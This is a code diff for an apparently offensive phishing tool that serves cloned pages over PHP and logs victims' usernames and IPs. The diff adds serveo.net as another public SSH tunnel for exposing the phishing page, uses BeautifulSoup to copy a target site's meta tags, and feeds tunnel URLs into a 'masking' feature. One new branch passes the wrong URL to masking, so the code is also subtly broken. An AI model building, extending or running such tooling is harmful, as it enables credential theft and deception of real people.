@@ -41,10 +41,8 @@ SOFTWARE.
 
 from argparse import ArgumentParser
 from importlib import import_module as eximport
-from glob import glob
 from hashlib import sha256
 from json import (
-    dumps as stringify,
     loads as parse
 )
 from os import (
@@ -57,9 +55,6 @@ from os import (
     mknod,
     popen,
     remove,
-    rename,
-    replace,
-    system
 )
 from os.path import (
     abspath,
@@ -72,43 +67,27 @@ from os.path import (
 from platform import uname
 from re import search, sub
 from shutil import (
-    copy as cp,
     copy2,
-    copyfile,
-    copytree,
     get_terminal_size,
     rmtree,
 )
 from signal import (
     SIGINT,
-    SIGKILL,
-    SIGTERM
 )
 from subprocess import (
     DEVNULL,
     PIPE,
     Popen,
-    STDOUT,
-    call,
     run
 )
 from smtplib import SMTP_SSL as smtp
-from socket import (
-    AF_INET as inet,
-    SOCK_STREAM as stream,
-    setdefaulttimeout,
-    socket
-)
 from sys import (
-    argv,
     stdout,
     version_info
 )
 from tarfile import open as taropen
 from time import (
-    ctime,
     sleep,
-    time
 )
 from zipfile import ZipFile
 
@@ -130,7 +109,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1.3"
+version="2.1.4"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -163,7 +142,7 @@ lx_help = f"""
 """
 
 packages = [ "php", "ssh" ]
-modules = [ "requests", "rich" ]
+modules = [ "requests", "rich", "beautifulsoup4:bs4" ]
 tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
@@ -180,8 +159,12 @@ if version_info[0] != supported_version:
     exit(0)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except ImportError:
         try:
             print(f"Installing {module}")
@@ -193,12 +176,17 @@ for module in modules:
         exit(1)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
+from bs4 import BeautifulSoup
 from requests import (
     get,
     head,
@@ -236,6 +224,7 @@ php_file = f"{tunneler_dir}/php.log"
 cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
 lhr_file = f"{tunneler_dir}/lhr.log"
+svo_file = f"{tunneler_dir}/svo.log"
 site_dir = f"{home}/.site"
 cred_file = f"{site_dir}/usernames.txt"
 ip_file = f"{site_dir}/ip.txt"
@@ -300,9 +289,11 @@ ts_commands = {
     "cloudflared": f"{cf_command} tunnel -url {local_url}",
     "localxpose": f"{lx_command} tunnel http -t {local_url}",
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "serveo": f"ssh -R 80:{local_url} serveo.net -T -n",
     "cf": f"{cf_command} tunnel -url {local_url}",
     "loclx": f"{lx_command} tunnel http -t {local_url}",
-    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "svo": f"ssh -R 80:{local_url} serveo.net -T -n"
 }
 
 
@@ -323,11 +314,11 @@ def is_running(process):
 
 # Check if a json is valid
 def is_json(myjson):
-  try:
-    parse(myjson)
-    return True
-  except:
-    return False
+    try:
+        parse(myjson)
+        return True
+    except:
+        return False
 
 
 # A simple copy function
@@ -453,9 +444,10 @@ def get_meta(url):
     allmeta = ""
     try:
         response = get(url, headers=headers).text
-        for line in response.split("\n"):
-            if line.strip().startswith("<meta "):
-                allmeta += line + "\n"
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "\n".join([str(meta) for meta in metas])
     except Exception as e:
         append(e, error_file)
     return allmeta
@@ -1217,7 +1209,7 @@ def server():
         sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
         sleep(2)
     sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
-    for logfile in [php_file, cf_file, lx_file, lhr_file]:
+    for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
         delete(logfile)
         if not isfile(logfile):
             try:
@@ -1229,6 +1221,7 @@ def server():
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
     lhr_log = open(lhr_file, "w")
+    svo_log = open(svo_file, "w")
     internet()
     bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
     sleep(2)
@@ -1255,6 +1248,7 @@ def server():
         bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
     sleep(10)
     cf_success = False
     for i in range(10):
@@ -1277,11 +1271,18 @@ def server():
             lhr_success = True
             break
         sleep(1)
-    if cf_success or lx_success or lhr_success:
+    svo_success = False
+    for i in range(10):
+        svo_url = grep("(https://[-0-9a-z.]*.svo.(life|pro))", svo_file)
+        if svo_url != "":
+            svo_success = True
+            break
+        sleep(1)
+    if cf_success or lx_success or lhr_success or svo_success:
         sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
             pexit()
         if cf_success:
             url_manager(cf_url, "CloudFlared")
@@ -1289,11 +1290,15 @@ def server():
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
+        if svo_success:
+            url_manager(svo_url, "Serveo")
         if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
         elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
+            masking(cf_url)
+        elif svo_success and tunneler.lower() in [ "serveo", "svo" ]:
             masking(cf_url)
         else:
             print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
